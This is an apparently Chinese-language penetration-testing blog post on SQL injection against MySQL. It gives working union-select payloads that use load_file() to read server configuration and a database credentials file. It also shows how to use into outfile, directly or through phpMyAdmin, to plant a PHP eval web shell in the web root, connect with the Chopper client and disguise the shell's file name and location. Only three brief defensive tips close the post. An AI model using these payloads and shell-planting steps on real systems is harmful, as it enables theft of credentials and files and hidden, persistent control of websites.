+++
date = "2016-06-20T08:10:27+08:00"
description = ""
draft = false
tags = ["injection"]
title = "SQL注入之MySQL函数利用"
topics = ["Pentest"]

+++

### 0x00 load_file()
* 条件:

> ```
1. 要有file_priv权限
2. 知道文件绝对路径
3. 能使用union
4. 对web目录有读权限  
注：若过滤了单引号，则可以将函数中的字符进行hex编码
```

* 一般步骤
    * 读/etc/init.d下的东西，这里有配置文件路径

    > ```
    ?id=1' union select 1,2,load_file('/etc/init.d/httpd')
    ```

    * 得到web安装路径  

    > ```
    ?id=1' union select 1,2,load_file('/etc/apache/conf/httpd.conf')
    ```

    * 读取密码文件

    > ```  
    ?id=1' union select 1,2,load_file('/site/xxx.com/conf/conn.inc.php')
    ```

### 0x01 into outfile
* 条件：

> ```
1. 要有file_priv权限  
2. 知道网站绝对路径  
3. 要能用union  
4. 对web目录有写权限  
5. 没有过滤单引号
```

* 一般方法

> 当知道路径时，可以直接用?id=1 union select "<?php @eval($_POST['c']);?>" into outfile("C:/phpStudy/WWW/a.php")

* 其他方法 
    * 登陆phpMyAdmin  
    
    > ```
    use test;  选择数据库为test
    create table aaa(bbb varchar(64));   在数据库中创建一个表aaa
    insert into aaa values("<?php @eval($_POST['c']);?>");   在aaa中插入一条数据<?php @eval($_POST['c']);?>
    select * from aaa into outfile 'C:/phpStudy/WWW/a.php';  将aaa中的数据导出到文件a.php
    ```

    * localhost:80/a.php能访问  
    
    > ```
    drop aaa;  //删除建立的表
    ```

    * 然后菜刀连接  

    > ```
    1. 菜刀连接：  
        C:\phpStudy\WWW\a.php
    2. 更改shell的名字并将shell放在较隐蔽的地方：  
        C:\phpStudy\WWW\phpMyAdmin\setup\lib\common.php
    ```

### 0x02 防御
* 数据库连接账号不要用root权限
* php关闭报错模式
* mysql账户没有权限向网站目录写文件